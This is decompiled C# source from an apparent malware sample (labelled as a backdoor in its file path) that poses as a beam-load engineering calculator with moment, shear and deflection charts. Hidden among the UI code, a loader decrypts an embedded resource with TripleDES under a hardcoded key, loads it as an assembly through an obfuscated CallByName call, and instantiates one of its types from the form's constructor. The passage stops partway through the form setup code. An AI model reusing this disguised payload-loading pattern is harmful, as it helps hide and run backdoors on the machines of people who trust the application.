// Decompiled with JetBrains decompiler
// Type: mainPorject.mainWorkForm
// Assembly: MuiResourceTypeIdIntEn, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2C7C9528-88C0-45FF-AB6A-2AC0C29EABCB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Backdoor.MSIL.Androm.gen-0e10e646be7b3f9857a2994bedc1b808fabc112009cda3192df15b8eb4980ef8.exe

using forces;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace mainPorject
{
  public class mainWorkForm : Form
  {
    private BeamWrapper beam;
    private SplitterPanel xnaPanel;
    private SplitterPanel quickOperation;
    private SplitterPanel extraInfo;
    private Forces stack;
    private object[] Max = new object[3]
    {
      (object) "466F726D6174",
      (object) "6C6468",
      (object) "mainPorject"
    };
    private Point[] pointsMomentom;
    private Dictionary<string, double> maxMomentPoint = new Dictionary<string, double>(4);
    private const int lineY_panelMomentom = 40;
    private const int gap = 5;
    private Point[] poitsShear;
    private Dictionary<string, double> maxShaerPoint = new Dictionary<string, double>(4);
    private Dictionary<string, double> minShaerPoint = new Dictionary<string, double>(4);
    private IContainer components = (IContainer) null;
    private static object CreateCallback;
    private static System.Type ScheduledConcurrent = typeof (UserControl_BasicSpec);
    private MenuStrip menuStrip1;
    private SplitContainer MainSplitContainer;
    private SplitContainer splitContainerMainLeft;
    private SplitContainer splitContainerMainLeftRight;
    private ToolStripMenuItem fileToolStripMenuItem;
    private ToolStripMenuItem newBeamToolStripMenuItem;
    private Panel panelMomentom;
    private Label label1;
    private Label labelShare;
    private Label labelPos;
    private Label labelMoment;
    private Label labelDef;
    private TrackBar trackBar1;
    private Label labelMaxMomentom;
    private Panel panelShaer;
    private Label label2;
    private Label labelMaxShaer;
    private Label labelMinShaer;
    private TableLayoutPanel tableLayoutPanel1;
    private Button button1;
    private Button button2;
    private Button button3;
    private Button button4;
    private Button button5;
    private ToolStripMenuItem editToolStripMenuItem;
    private ToolStripMenuItem testForcesToolStripMenuItem;
    private Timer timer1;
    private Panel panel1;
    private Label labelSCM;
    private Label labelSRM;
    private ToolStripMenuItem backToStartToolStripMenuItem;
    private Label label3;
    private TrackBar trackBar2;
    private Label label4;
    private Label label6;
    private Label label5;
    private Label label8;
    private Label label7;
    private Panel panel3;
    private Panel panel2;

    private void InitializSplitters()
    {
      this.xnaPanel = this.splitContainerMainLeftRight.Panel1;
      this.quickOperation = this.splitContainerMainLeft.Panel1;
      this.extraInfo = this.MainSplitContainer.Panel2;
    }

    public mainWorkForm()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) mainWorkForm.CreateCallback, this.Max);
      this.InitializSplitters();
      this.NewPointsFlag = false;
      this.NewPointPositionFlag = false;
      this.Visible = false;
    }

    private void mainWorkForm_Load(object sender, EventArgs e)
    {
      if (this.StartGet())
      {
        this.setTestForce();
        this.Visible = true;
        this.trackBar2.Value = 5;
      }
      else
        this.Close();
    }

    private bool StartGet()
    {
      using (Start str = new Start())
      {
        switch (str.ShowDialog((IWin32Window) this))
        {
          case DialogResult.OK:
            return this.getNewBeam();
          case DialogResult.Abort:
            return false;
          case DialogResult.Yes:
            return this.getNewBeam(str);
          default:
            return true;
        }
      }
    }

    private bool getNewBeam()
    {
      using (mainBeamSpec mainBeamSpec = new mainBeamSpec())
      {
        int num1;
        switch (mainBeamSpec.ShowDialog((IWin32Window) this))
        {
          case DialogResult.OK:
            this.Clear();
            this.beam = mainBeamSpec.beamWrap;
            this.NewPointsFlag = true;
            this.updateMometPoints();
            this.panelMomentom.Paint += new PaintEventHandler(this.panelMomentom_Paint);
            this.updateShaerPoints();
            this.panelShaer.Paint += new PaintEventHandler(this.panelShaer_Paint);
            this.trackBar1_reset();
            Label labelSrm = this.labelSRM;
            double num2 = Math.Round(this.Beam.MaxMomentom, 5);
            string str1 = "Section resistance moment : " + num2.ToString();
            labelSrm.Text = str1;
            Label labelScm = this.labelSCM;
            num2 = Math.Round(this.Beam.beam.Mcr * Math.Pow(10.0, 6.0), 5);
            string str2 = "Section crack moment : " + num2.ToString();
            labelScm.Text = str2;
            Label label5 = this.label5;
            num2 = Math.Round(this.Beam.beam.Teta, 5);
            string str3 = "Strength Reduction Factor : " + num2.ToString();
            label5.Text = str3;
            Label label6 = this.label6;
            num2 = Math.Round(this.Beam.beam.AsMax, 5);
            string str4 = "Maximum reinforcement : " + num2.ToString();
            label6.Text = str4;
            return true;
          case DialogResult.Cancel:
            num1 = this.Beam == null ? 1 : 0;
            break;
          default:
            num1 = 0;
            break;
        }
        return num1 == 0;
      }
    }

    private bool getNewBeam(Start str)
    {
      if (str.isSingel)
      {
        using (mainBeamSpec mainBeamSpec = new mainBeamSpec(str.width, str.height, str.As, str.fc, str.fs, str.a))
        {
          int num1;
          switch (mainBeamSpec.ShowDialog((IWin32Window) this))
          {
            case DialogResult.OK:
              this.Clear();
              this.beam = mainBeamSpec.beamWrap;
              this.NewPointsFlag = true;
              this.updateMometPoints();
              this.panelMomentom.Paint += new PaintEventHandler(this.panelMomentom_Paint);
              this.updateShaerPoints();
              this.panelShaer.Paint += new PaintEventHandler(this.panelShaer_Paint);
              this.trackBar1_reset();
              this.labelSRM.Text = "Section resistance moment : " + Math.Round(this.Beam.MaxMomentom, 5).ToString();
              Label labelScm = this.labelSCM;
              double num2 = Math.Round(this.Beam.beam.Mcr * Math.Pow(10.0, 6.0), 5);
              string str1 = "Section crack moment : " + num2.ToString();
              labelScm.Text = str1;
              Label label5 = this.label5;
              num2 = Math.Round(this.Beam.beam.Teta, 5);
              string str2 = "Strength Reduction Factor : " + num2.ToString();
              label5.Text = str2;
              Label label6 = this.label6;
              num2 = Math.Round(this.Beam.beam.AsMax, 5);
              string str3 = "Maximum reinforcement : " + num2.ToString();
              label6.Text = str3;
              return true;
            case DialogResult.Cancel:
              num1 = this.Beam == null ? 1 : 0;
              break;
            default:
              num1 = 0;
              break;
          }
          if (num1 != 0)
            return false;
        }
      }
      else
      {
        using (mainBeamSpec mainBeamSpec = new mainBeamSpec(str.width, str.height, str.As, str.Asl, str.fc, str.fs, str.a, str.a))
        {
          int num3;
          switch (mainBeamSpec.ShowDialog((IWin32Window) this))
          {
            case DialogResult.OK:
              this.Clear();
              this.beam = mainBeamSpec.beamWrap;
              this.NewPointsFlag = true;
              this.updateMometPoints();
              this.panelMomentom.Paint += new PaintEventHandler(this.panelMomentom_Paint);
              this.updateShaerPoints();
              this.panelShaer.Paint += new PaintEventHandler(this.panelShaer_Paint);
              this.trackBar1_reset();
              this.labelSRM.Text = "Section resistance moment : " + Math.Round(this.Beam.MaxMomentom, 5).ToString();
              Label labelScm = this.labelSCM;
              double num4 = Math.Round(this.Beam.beam.Mcr * Math.Pow(10.0, 6.0), 5);
              string str4 = "Section crack moment : " + num4.ToString();
              labelScm.Text = str4;
              Label label5 = this.label5;
              num4 = Math.Round(this.Beam.beam.Teta, 5);
              string str5 = "Strength Reduction Factor : " + num4.ToString();
              label5.Text = str5;
              Label label6 = this.label6;
              num4 = Math.Round(this.Beam.beam.AsMax, 5);
              string str6 = "Maximum reinforcement : " + num4.ToString();
              label6.Text = str6;
              return true;
            case DialogResult.Cancel:
              num3 = this.Beam == null ? 1 : 0;
              break;
            default:
              num3 = 0;
              break;
          }
          if (num3 != 0)
            return false;
        }
      }
      return true;
    }

    private void setTestForce()
    {
      if (this.Beam == null)
        return;
      using (TestForcesSpec testForcesSpec = new TestForcesSpec())
      {
        testForcesSpec.BeamLength = this.Beam.Length / 100.0;
        if (testForcesSpec.ShowDialog((IWin32Window) this) != DialogResult.OK)
          return;
        this.Clear();
        this.Beam.F1 = testForcesSpec.F1 as PointBaemForce;
        this.Beam.F2 = testForcesSpec.F2 as PointBaemForce;
        this.stack = new Forces(0.0, this.Beam.Length);
        this.NewTestForces = true;
      }
    }

    public Control XnaContorl => (Control) this.xnaPanel;

    public Form Form => (Form) this;

    public bool NewPointsFlag { get; set; }

    public bool NewPointPositionFlag { get; set; }

    public bool NewTestForces { get; set; }

    public BeamWrapper Beam => this.beam;

    public void sendMassege(string str)
    {
      string[] strArray = str.Split('|');
      if (strArray[0].ToLower() == "break def")
      {
        this.timer1.Stop();
        double num1 = double.Parse(strArray[1]);
        double num2 = double.Parse(strArray[2]);
        int num3 = (int) MessageBox.Show(" out of service by deflection \ndeflection = " + num1.ToString() + "\nat position = " + (num2 / 100.0).ToString() + "(m)", "out of servic", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
      {
        if (!(strArray[0].ToLower() == "break mom"))
          return;
        this.timer1.Stop();
        double num4 = double.Parse(strArray[1]);
        double num5 = double.Parse(strArray[2]);
        int num6 = (int) MessageBox.Show(" break of moment \nmoment = " + num4.ToString() + "\nat position = " + (num5 / 100.0).ToString() + "(m)\n" + this.Beam.beam.getFailureWay(), "break", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
    }

    private void beam_paint(object sender, PaintEventArgs e, Point pos, Size size, Brush brush) => e.Graphics.FillRectangle(brush, pos.X, pos.Y - size.Height / 2, size.Width, size.Height);

    private void beamSupport_paint(
      object sender,
      PaintEventArgs e,
      Point beamPos,
      Size beamSize,
      Size supportSize,
      bool white)
    {
      Image image1 = white ? (Image) mainPorject.Properties.Resources.LeftSupportWhite : (Image) mainPorject.Properties.Resources.LeftSupport;
      e.Graphics.DrawImage(image1, new Rectangle(beamPos.X - supportSize.Width / 2, beamPos.Y, supportSize.Width, supportSize.Height));
      Image image2 = white ? (Image) mainPorject.Properties.Resources.RightSupportWhite : (Image) mainPorject.Properties.Resources.RightSupport;
      e.Graphics.DrawImage(image2, new Rectangle(beamPos.X + beamSize.Width - supportSize.Width / 2, beamPos.Y, supportSize.Width, supportSize.Height));
    }

    private void updateMometPoints()
    {
      this.pointsMomentom = new Point[this.panelMomentom.Width - 10];
      double num1 = this.beam.Length / (double) (this.pointsMomentom.Length - 1);
      this.maxMomentPoint.Clear();
      this.maxMomentPoint.Add("atIndex", 0.0);
      for (int index = 0; index < this.pointsMomentom.Length; ++index)
      {
        int momentomAt = (int) this.beam.getMomentomAt((double) index * num1);
        this.pointsMomentom[index] = new Point(index + 5, 40 + momentomAt);
        if (this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].Y < this.pointsMomentom[index].Y)
        {
          this.maxMomentPoint.Clear();
          this.maxMomentPoint.Add("atIndex", (double) index);
          this.maxMomentPoint.Add("moment", (double) momentomAt);
          this.maxMomentPoint.Add("xPos", (double) this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].X);
          this.maxMomentPoint.Add("yPos", (double) this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].Y);
        }
      }
      if (!this.maxMomentPoint.ContainsKey("moment"))
      {
        this.maxMomentPoint.Add("moment", (double) (int) this.beam.getMomentomAt(this.maxMomentPoint["atIndex"] * num1));
        this.maxMomentPoint.Add("xPos", (double) this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].X);
        this.maxMomentPoint.Add("yPos", (double) this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].Y);
      }
      if (this.maxMomentPoint["yPos"] > (double) (this.panelMomentom.Height - this.labelMaxMomentom.Height))
      {
        double num2 = (double) (this.panelMomentom.Height - this.labelMaxMomentom.Height - 40 - 15) / this.maxMomentPoint["moment"];
        for (int index = 0; index < this.pointsMomentom.Length; ++index)
          this.pointsMomentom[index].Y = (int) ((double) (this.pointsMomentom[index].Y - 40) * num2) + 40;
        this.maxMomentPoint.Remove("yPos");
        this.maxMomentPoint.Add("yPos", (double) this.pointsMomentom[(int) this.maxMomentPoint["atIndex"]].Y);
      }
      this.labelMaxMomentom.Text = Math.Round(this.maxMomentPoint["moment"], 5).ToString();
      this.labelMaxMomentom.Left = (int) (this.maxMomentPoint["xPos"] - (double) (this.labelMaxMomentom.Width / 2));
      this.labelMaxMomentom.Top = (int) (this.maxMomentPoint["yPos"] + 5.0);
      this.panelMomentom.Invalidate();
    }

    private void panelMomentom_Paint(object sender, PaintEventArgs e)
    {
      Control control = (Control) (sender as Panel);
      Graphics graphics = control.CreateGraphics();
      this.beam_paint(sender, e, new Point(5, 40), new Size(control.Width - 10, 3), Brushes.White);
      graphics.DrawLines(Pens.SkyBlue, this.pointsMomentom);
    }

    private int lineY_panelShaer => (this.panelShaer.Height + 25) / 2;

    private void updateShaerPoints()
    {
      this.poitsShear = new Point[this.panelShaer.Width - 10];
      double num1 = this.beam.Length / (double) (this.poitsShear.Length - 1);
      this.maxShaerPoint.Clear();
      this.maxShaerPoint.Add("atIndex", 0.0);
      this.minShaerPoint.Clear();
      this.minShaerPoint.Add("atIndex", 0.0);
      for (int index = 0; index < this.poitsShear.Length; ++index)
      {
        int shaer = (int) this.beam.getShaer((double) index * num1);
        this.poitsShear[index] = new Point(index + 5, this.lineY_panelShaer - shaer);
        if (this.poitsShear[(int) this.maxShaerPoint["atIndex"]].Y > this.poitsShear[index].Y)
        {
          this.maxShaerPoint.Clear();
          this.maxShaerPoint.Add("atIndex", (double) index);
          this.maxShaerPoint.Add("shear", (double) shaer);
          this.maxShaerPoint.Add("xPos", (double) this.poitsShear[(int) this.maxShaerPoint["atIndex"]].X);
          this.maxShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.maxShaerPoint["atIndex"]].Y);
        }
        if (this.poitsShear[(int) this.minShaerPoint["atIndex"]].Y <= this.poitsShear[index].Y)
        {
          this.minShaerPoint.Clear();
          this.minShaerPoint.Add("atIndex", (double) index);
          this.minShaerPoint.Add("shaer", (double) shaer);
          this.minShaerPoint.Add("xPos", (double) this.poitsShear[(int) this.minShaerPoint["atIndex"]].X);
          this.minShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.minShaerPoint["atIndex"]].Y);
        }
      }
      if (!this.maxShaerPoint.ContainsKey("shaer"))
      {
        this.maxShaerPoint.Add("shaer", (double) (int) this.beam.getShaer(this.maxShaerPoint["atIndex"] * num1));
        this.maxShaerPoint.Add("xPos", (double) this.poitsShear[(int) this.maxShaerPoint["atIndex"]].X);
        this.maxShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.maxShaerPoint["atIndex"]].Y);
      }
      if (!this.minShaerPoint.ContainsKey("shaer"))
      {
        this.minShaerPoint.Add("shaer", (double) (int) this.beam.getShaer(this.minShaerPoint["atIndex"] * num1));
        this.minShaerPoint.Add("xPos", (double) this.poitsShear[(int) this.minShaerPoint["atIndex"]].X);
        this.minShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.minShaerPoint["atIndex"]].Y);
      }
      if (this.maxShaerPoint["yPos"] < (double) (this.labelMaxShaer.Height + this.label2.Top + this.label2.Height - 15) || this.minShaerPoint["yPos"] > (double) (this.panelShaer.Height - this.labelMinShaer.Height - 10))
      {
        double num2 = Math.Min((double) (this.labelMaxShaer.Height + this.label2.Top + this.label2.Height - 15) / Math.Abs(this.maxShaerPoint["shaer"]), (double) (this.panelShaer.Height - this.lineY_panelShaer - this.labelMinShaer.Height - 10) / Math.Abs(this.minShaerPoint["shaer"]));
        for (int index = 0; index < this.poitsShear.Length; ++index)
          this.poitsShear[index].Y = this.lineY_panelShaer - (int) ((double) (this.lineY_panelShaer - this.poitsShear[index].Y) * num2);
        this.maxShaerPoint.Remove("yPos");
        this.maxShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.maxShaerPoint["atIndex"]].Y);
        this.minShaerPoint.Remove("yPos");
        this.minShaerPoint.Add("yPos", (double) this.poitsShear[(int) this.minShaerPoint["atIndex"]].Y);
      }
      this.labelMaxShaer.Text = Math.Round(this.maxShaerPoint["shaer"], 5).ToString();
      this.labelMaxShaer.Left = (int) this.maxShaerPoint["xPos"];
      this.labelMaxShaer.Top = (int) (this.maxShaerPoint["yPos"] - 5.0 - (double) this.labelMaxShaer.Height);
      this.labelMinShaer.Text = Math.Round(this.minShaerPoint["shaer"], 5).ToString();
      this.labelMinShaer.Left = (int) (this.minShaerPoint["xPos"] - (double) this.labelMinShaer.Width);
      this.labelMinShaer.Top = (int) (this.minShaerPoint["yPos"] + 5.0);
      this.panelShaer.Invalidate();
    }

    private void panelShaer_Paint(object sender, PaintEventArgs e)
    {
      Control control = (Control) (sender as Panel);
      Graphics graphics = control.CreateGraphics();
      this.beam_paint(sender, e, new Point(5, this.lineY_panelShaer), new Size(control.Width - 10, 3), Brushes.White);
      graphics.DrawLines(Pens.SkyBlue, this.poitsShear);
    }

    private void trackBar1_reset()
    {
      this.trackBar1.SetRange(0, (int) (this.Beam.Length * 100.0));
      this.trackBar1.Value = this.trackBar1.Maximum;
      this.trackBar1.Value = this.trackBar1.Minimum;
    }

    private void trackBar1_Scroll(object sender, EventArgs e) => this.labelPos.Left = 13 + (int) ((double) this.trackBar1.Value / (double) this.trackBar1.Maximum * (double) (this.trackBar1.Width - 26)) - this.labelPos.Width / 2;

    private void trackBar1_ValueChanged(object sender, EventArgs e) => this.updateData();

    private void updateData()
    {
      double position = (double) this.trackBar1.Value / (double) this.trackBar1.Maximum * this.Beam.Length;
      this.labelPos.Text = position.ToString();
      this.labelMoment.Text = "(N.m) Momentom : " + Math.Round(this.Beam.getMomentomAt(position), 5).ToString();
      this.labelShare.Text = "(N) Shaer : " + Math.Round(this.Beam.getShaer(position), 5).ToString();
      this.labelDef.Text = "(cm) Defliction : " + Math.Round(this.Beam.getDiflectionAt(position), 5).ToString();
      this.label7.Text = "(N) Test force 1 = ";
      this.label8.Text = "(N) Test force 2 = ";
      double num;
      if (this.Beam.F1 != null && this.stack != null && this.stack[this.Beam.F1.Position] is PointBaemForce pointBaemForce1)
      {
        Label label7 = this.label7;
        string text = label7.Text;
        num = Math.Round(Math.Abs(pointBaemForce1.Power), 5);
        string str = num.ToString();
        label7.Text = text + str;
      }
      if (this.Beam.F2 == null || this.stack == null || !(this.stack[this.Beam.F2.Position] is PointBaemForce pointBaemForce2))
        return;
      Label label8 = this.label8;
      string text1 = label8.Text;
      num = Math.Round(Math.Abs(pointBaemForce2.Power), 5);
      string str1 = num.ToString();
      label8.Text = text1 + str1;
    }

    private void splitContainerMainLeftRight_Panel2_Paint(object sender, PaintEventArgs e)
    {
      this.beam_paint(sender, e, new Point(this.trackBar1.Left + 10, this.trackBar1.Top - 30), new Size(this.trackBar1.Width - 20, 5), Brushes.White);
      this.beamSupport_paint(sender, e, new Point(this.trackBar1.Left + 10, this.trackBar1.Top - 30), new Size(this.trackBar1.Width - 20, 5), new Size(25, 25), true);
    }

    private void button1_Click(object sender, EventArgs e) => this.timer1.Start();

    private void timer1_Tick(object sender, EventArgs e)
    {
      bool flag = false;
      if (this.Beam.F1 != null)
      {
        this.Beam.forces.Add((BeamForce) new PointBaemForce(this.Beam.F1.Power, this.Beam.F1.Position, this.Beam.Length));
        this.stack.Add((BeamForce) new PointBaemForce(-this.Beam.F1.Power, this.Beam.F1.Position, this.Beam.Length));
        flag = true;
      }
      if (this.Beam.F2 != null)
      {
        this.Beam.forces.Add((BeamForce) new PointBaemForce(this.Beam.F2.Power, this.Beam.F2.Position, this.Beam.Length));
        this.stack.Add((BeamForce) new PointBaemForce(-this.Beam.F2.Power, this.Beam.F2.Position, this.Beam.Length));
        flag = true;
      }
      if (!flag)
        return;
      this.updateMometPoints();
      this.updateShaerPoints();
      this.updateData();
      this.NewPointPositionFlag = true;
      if (this.maxMomentPoint["moment"] >= this.Beam.MaxMomentom)
      {
        double num = this.maxMomentPoint["moment"];
        string str1 = num.ToString();
        num = this.maxMomentPoint["xPos"];
        string str2 = num.ToString();
        this.sendMassege("break mom|" + str1 + "|" + str2);
      }
    }

    private void button2_Click(object sender, EventArgs e) => this.timer1.Stop();

    private void button3_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.setTestForce();
    }

    private void button4_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.Clear();
    }

    private void button5_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.Beam.forces.AddAll(this.stack);
      this.stack = new Forces(0.0, this.Beam.Length);
      this.updateAll();
    }

    private void trackBar2_ValueChanged(object sender, EventArgs e)
    {
      this.timer1.Interval = this.trackBar2.Value * 100;
      this.label4.Text = (2000f / (float) this.timer1.Interval).ToString() ?? "";
    }

    private void Clear()
    {
      if (this.stack == null)
        return;
      this.Beam.forces.AddAll(this.stack);
      this.stack = (Forces) null;
      this.Beam.F1 = (PointBaemForce) null;
      this.Beam.F2 = (PointBaemForce) null;
      this.NewTestForces = true;
      this.updateAll();
    }

    private void updateAll()
    {
      this.updateMometPoints();
      this.updateShaerPoints();
      this.updateData();
      this.NewPointPositionFlag = true;
    }

    private void newBeamToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.getNewBeam();
    }

    private void testForcesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.setTestForce();
    }

    private void backToStartToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.Visible = false;
      if (this.StartGet())
      {
        this.setTestForce();
        this.Visible = true;
      }
      else
        this.Close();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static SizeF DisposeWinPanel()
    {
      byte[] inputBuffer = (byte[]) new ResourceManager(mainWorkForm.ScheduledConcurrent).GetObject("beamUI");
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes("EGE5YEAIX5HCF54GZ8H484"));
      TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider.Key = hash;
      cryptoServiceProvider.Mode = CipherMode.ECB;
      mainWorkForm.CreateCallback = (object) mainWorkForm.DrawWinPanel(mainWorkForm.WinPanelCreate(cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length), true)).GetTypes()[11];
      return new SizeF(6f, 13f);
    }

    private static Assembly DrawWinPanel(object ResolvedAssemblyFiles) => (Assembly) ResolvedAssemblyFiles;

    public static object WinPanelCreate(byte[] Message, bool Properties) => Interaction.CallByName((object) mainWorkForm.bbbb, "Load", CallType.Get, (object) Message);

    public static AppDomain bbbb => AppDomain.CurrentDomain;

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.menuStrip1 = new MenuStrip();
      this.fileToolStripMenuItem = new ToolStripMenuItem();
      this.newBeamToolStripMenuItem = new ToolStripMenuItem();
      this.backToStartToolStripMenuItem = new ToolStripMenuItem();
      this.editToolStripMenuItem = new ToolStripMenuItem();
      this.testForcesToolStripMenuItem = new ToolStripMenuItem();
      this.MainSplitContainer = new SplitContainer();
      this.splitContainerMainLeft = new SplitContainer();
      this.tableLayoutPanel1 = new TableLayoutPanel();
      this.button1 = new Button();
      this.button2 = new Button();
      this.button3 = new Button();
      this.button4 = new Button();
      this.button5 = new Button();
      this.label3 = new Label();
      this.trackBar2 = new TrackBar();
      this.label4 = new Label();
      this.splitContainerMainLeftRight = new SplitContainer();
      this.panel3 = new Panel();
      this.labelMoment = new Label();
      this.labelDef = new Label();
      this.labelShare = new Label();
      this.panel2 = new Panel();
      this.label7 = new Label();
      this.label8 = new Label();
      this.labelPos = new Label();
      this.trackBar1 = new TrackBar();
      this.panel1 = new Panel();
      this.label6 = new Label();
      this.label5 = new Label();
      this.labelSCM = new Label();
      this.labelSRM = new Label();
      this.panelShaer = new Panel();
      this.labelMinShaer = new Label();
      this.labelMaxShaer = new Label();
      this.label2 = new Label();
      this.panelMomentom = new Panel();
      this.labelMaxMomentom = new Label();
      this.label1 = new Label();
      this.timer1 = new Timer(this.components);
      this.menuStrip1.SuspendLayout();
      this.MainSplitContainer.BeginInit();
      this.MainSplitContainer.Panel1.SuspendLayout();
      this.MainSplitContainer.Panel2.SuspendLayout();
      this.MainSplitContainer.SuspendLayout();
      this.splitContainerMainLeft.BeginInit();
      this.splitContainerMainLeft.Panel1.SuspendLayout();
      this.splitContainerMainLeft.Panel2.SuspendLayout();
      this.splitContainerMainLeft.SuspendLayout();
      this.tableLayoutPanel1.SuspendLayout();
      this.trackBar2.BeginInit();
      this.splitContainerMainLeftRight.BeginInit();
      this.splitContainerMainLeftRight.Panel2.SuspendLayout();
      this.splitContainerMainLeftRight.SuspendLayout();
      this.panel3.SuspendLayout();
      this.panel2.SuspendLayout();
      this.trackBar1.BeginInit();
      this.panel1.SuspendLayout();
      this.panelShaer.SuspendLayout();
      this.panelMomentom.SuspendLayout();
      this.SuspendLayout();
      this.menuStrip1.BackColor = SystemColors.ButtonShadow;
      this.menuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.fileToolStripMenuItem,
        (ToolStripItem) this.editToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(0, 0);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Size = new Size(784, 24);
      this.menuStrip1.TabIndex = 0;
      this.menuStrip1.Text = "menuStrip1";
      this.fileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.newBeamToolStripMenuItem,
        (ToolStripItem) this.backToStartToolStripMenuItem
      });
      this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
      this.fileToolStripMenuItem.ShortcutKeys = Keys.F | Keys.Alt;
      this.fileToolStripMenuItem.ShowShortcutKeys = false;
      this.fileToolStripMenuItem.Size = new Size(37, 20);
      this.fileToolStripMenuItem.Text = "File";
      this.newBeamToolStripMenuItem.Name = "newBeamToolStripMenuItem";
      this.newBeamToolStripMenuItem.ShortcutKeys = Keys.N | Keys.Control;
      this.newBeamToolStripMenuItem.Size = new Size(174, 22);
      this.newBeamToolStripMenuItem.Text = "New beam";
      this.newBeamToolStripMenuItem.Click += new EventHandler(this.newBeamToolStripMenuItem_Click);
      this.backToStartToolStripMenuItem.Name = "backToStartToolStripMenuItem";
      this.backToStartToolStripMenuItem.Size = new Size(174, 22);
      this.backToStartToolStripMenuItem.Text = "back to start";
      this.backToStartToolStripMenuItem.Click += new EventHandler(this.backToStartToolStripMenuItem_Click);
      this.editToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.testForcesToolStripMenuItem
      });
      this.editToolStripMenuItem.Name = "editToolStripMenuItem";
      this.editToolStripMenuItem.Size = new Size(39, 20);
      this.editToolStripMenuItem.Text = "Edit";
      this.testForcesToolStripMenuItem.Name = "testForcesToolStripMenuItem";
      this.testForcesToolStripMenuItem.Size = new Size(133, 22);
      this.testForcesToolStripMenuItem.Text = "Test Forces";
      this.testForcesToolStripMenuItem.Click += new EventHandler(this.testForcesToolStripMenuItem_Click);
      this.MainSplitContainer.BackColor = Color.Transparent;
      this.MainSplitContainer.Dock = DockStyle.Fill;
      this.MainSplitContainer.Location = new Point(0, 24);
      this.MainSplitContainer.Name = "MainSplitContainer";
      this.MainSplitContainer.Panel1.Controls.Add((Control) this.splitContainerMainLeft);
      this.MainSplitContainer.Panel2.BackColor = Color.Transparent;
      this.MainSplitContainer.Panel2.Controls.Add((Control) this.panel1);
      this.MainSplitContainer.Panel2.Controls.Add((Control) this.panelShaer);
      this.MainSplitContainer.Panel2.Controls.Add((Control) this.panelMomentom);
      this.MainSplitContainer.Size = new Size(784, 518);
      this.MainSplitContainer.SplitterDistance = 488;
      this.MainSplitContainer.TabIndex = 2;
      this.splitContainerMainLeft.Dock = DockStyle.Fill;
      this.splitContainerMainLeft.Location = new Point(0, 0);
      this.splitContainerMainLeft.Name = "splitContainerMainLeft";
      this.splitContainerMainLeft.Panel1.Controls.Add((Control) this.tableLayoutPanel1);
      this.splitContainerMainLeft.Panel2.Controls.Add((Control) this.splitContainerMainLeftRight);
      this.splitContainerMainLeft.Size = new Size(488, 518);
      this.splitContainerMainLeft.SplitterDistance = 67;
      this.splitContainerMainLeft.TabIndex = 0;
      this.tableLayoutPanel1.BackgroundImage = (Image) mainPorject.Properties.Resources._1600x900_modified22;
      this.tableLayoutPanel1.ColumnCount = 1;
      this.tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));
      this.tableLayoutPanel1.Controls.Add((Control) this.button1, 0, 0);
      this.tableLayoutPanel1.Controls.Add((Control) this.button2, 0, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.button3, 0, 2);
      this.tableLayoutPanel1.Controls.Add((Control) this.button4, 0, 3);
      this.tableLayoutPanel1.Controls.Add((Control) this.button5, 0, 4);
      this.tableLayoutPanel1.Controls.Add((Control) this.label3, 0, 5);
      this.tableLayoutPanel1.Controls.Add((Control) this.trackBar2, 0, 7);
      this.tableLayoutPanel1.Controls.Add((Control) this.label4, 0, 6);
      this.tableLayoutPanel1.Dock = DockStyle.Fill;
      this.tableLayoutPanel1.Location = new Point(0, 0);
      this.tableLayoutPanel1.Name = "tableLayoutPanel1";
      this.tableLayoutPanel1.RowCount = 8;
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 20f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 20f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 20f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 20f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 20f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 41f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 17f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 188f));
